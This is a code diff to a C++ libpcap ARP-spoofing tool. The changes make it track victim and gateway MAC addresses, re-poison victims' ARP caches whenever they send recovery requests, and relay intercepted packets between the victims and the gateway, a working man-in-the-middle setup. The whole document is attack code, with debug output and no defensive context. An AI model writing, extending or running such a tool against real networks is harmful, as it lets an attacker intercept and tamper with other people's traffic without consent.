@@ -17,11 +17,11 @@ extern "C" {
 #include "arphdr.h"
 #include "ethhdr.h"
 #include "iphdr.h"
-
+#include <set>
 
 #define PACKET_SIZE (sizeof(struct EthArpPacket))
 
-
+std::set<Mac> maclist;
 std::map<Ip, Mac> m;
 
 struct EthArpPacket final {
@@ -167,6 +167,7 @@ int main(int argc, char* argv[]) {
         fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
         return -1;
     }
+    Mac gateway_mac;
     Ip my_ip;
     Mac my_mac;
     get_my_info(&my_ip, &my_mac);
@@ -196,9 +197,13 @@ int main(int argc, char* argv[]) {
         else {
             get_sender_mac(pcap, my_ip, my_mac, target_ip, &target_mac, sender_ip);
         }
-
+        std::cout <<std::string(target_mac)<< std::endl;
+        gateway_mac = target_mac;
+        maclist.insert(sender_mac);
+        maclist.insert(target_mac);
         infect(pcap, my_mac, target_ip, target_mac, sender_ip);
         printf("target is infected\n");
+
         cur += 2;
 
     }
@@ -213,31 +218,30 @@ int main(int argc, char* argv[]) {
         uint16_t ip_type = ntohs(ethhdr->type_);
         if((ip_type != Ipv4) && (ip_type != EthHdr::Arp)) continue;
 
+        ArpHdr *arphdr = (ArpHdr*)(received_packet +sizeof(EthHdr));
+        uint16_t hrd = ntohs(arphdr -> hrd_);
+        uint16_t pro = ntohs(arphdr->pro_);
+      //  Mac smac_ = arphdr->smac_;
+        Ip sip_ = ntohl(arphdr->sip_);
+        Ip tip = ntohl(arphdr->tip_);
+        uint16_t op = htons(arphdr->op_);
+
         //recovery
         std::cout <<ip_type<< std::endl;
-        if(((dmac.isBroadcast())||(dmac == my_mac)) && (ip_type == EthHdr::Arp)){
-           // std::cout << "cast"<< std::endl;
-            ArpHdr *arphdr = (ArpHdr*)(received_packet +sizeof(EthHdr));
-            uint16_t hrd = ntohs(arphdr -> hrd_);
-            uint16_t pro = ntohs(arphdr->pro_);
-            Mac smac = arphdr->smac_;
-            Ip sip = ntohl(arphdr->sip_);
-            Ip tip = ntohl(arphdr->tip_);
-
-            if((ArpHdr::ETHER == hrd) && (EthHdr::Ip4 == pro)) {
-                uint16_t op = htons(arphdr->op_);
-                if(op != ArpHdr::Request) continue;
-                 std::cout << "Recovery Request"<< std::endl;
-                if((m.find(sip) != m.end()) && (m.find(tip) != m.end())){
-
+        if((dmac.isBroadcast()||(dmac == my_mac)) && (ip_type == EthHdr::Arp)){
+            if(maclist.find(smac) != maclist.end()){
+                if((ArpHdr::ETHER == hrd) && (EthHdr::Ip4 == pro)){
+                    if(op != ArpHdr::Request) continue;
+                    std::cout << "Recovery Request"<< std::endl;
                     Mac tmac = m.find(tip)->second;
-                    infect(pcap, my_mac, sip, smac, tip);
-                    infect(pcap, my_mac, tip, tmac, sip);
+                    std::cout <<std:: string(smac)<< std::endl;
+                    std::cout << std::string(tmac)<< std::endl;
+                    infect(pcap, my_mac, sip_, smac, tip);
+                    infect(pcap, my_mac, tip, tmac, sip_);
                     std::cout << "ReInfect!!"<< std::endl;
+                    continue;
                 }
-
             }
-            continue;
         }
 
         IpHdr *iphdr = (IpHdr*)(received_packet + sizeof(EthHdr));
@@ -252,8 +256,14 @@ int main(int argc, char* argv[]) {
         std::cout << std::string(dip) << std::endl;
         if((m.find(sip) != m.end()) || (m.find(dip) != m.end())){
             std::cout << "!!"<< std::endl;
+
+            if(ethhdr->smac_ != gateway_mac){
+                ethhdr->dmac_ = gateway_mac;
+            }
+            else ethhdr->dmac_ = m.find(dip)->second;
             ethhdr->smac_ = my_mac;
-            ethhdr->dmac_ = m.find(dip)->second;
+            std::cout << std::string(ethhdr->smac_)<< std::endl;
+            std::cout << std::string(ethhdr->dmac_)<< std::endl;
             if (pcap_sendpacket(pcap, received_packet, header->caplen) != 0) {
                 fprintf(stderr, "Error sending relay packet: %s\n", pcap_geterr(pcap));
                 exit(EXIT_FAILURE);
